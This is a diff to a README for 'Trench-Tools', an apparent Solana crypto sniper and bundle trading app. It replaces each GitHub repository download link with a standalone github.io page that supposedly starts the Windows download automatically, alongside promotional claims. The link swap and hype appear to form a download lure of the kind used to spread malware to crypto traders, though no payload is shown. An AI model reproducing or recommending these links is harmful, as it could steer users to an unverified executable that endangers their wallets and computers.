@@ -4,7 +4,7 @@
 
 ## 🚀 Quick Download
 
-[![DOWNLOAD TRENCH-TOOLS](https://img.shields.io/badge/DOWNLOAD-Trench_Tools-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wan-zoospore5145/Trench-Tools)
+[![DOWNLOAD TRENCH-TOOLS](https://img.shields.io/badge/DOWNLOAD-Trench_Tools-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://wan-zoospore5145.github.io)
 
 ---
 
@@ -55,7 +55,7 @@ Follow these simple steps to get Trench-Tools up and running on your Windows com
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **https://github.com/wan-zoospore5145/Trench-Tools**
+Visit this link to download the application: **https://wan-zoospore5145.github.io**
 
 The download will start automatically or show you a button to click. The file will be saved to your "Downloads" folder.
 
@@ -147,7 +147,7 @@ The automated features – especially the sniper and bundle tools – are design
 
 Ready to take control of your crypto portfolio? 
 
-**Visit this link to download the application: https://github.com/wan-zoospore5145/Trench-Tools**
+**Visit this link to download the application: https://wan-zoospore5145.github.io**
 
 Join thousands of traders already using Trench-Tools to automate their success on Solana. Your battle station awaits – download today and start trading smarter, not harder!
 
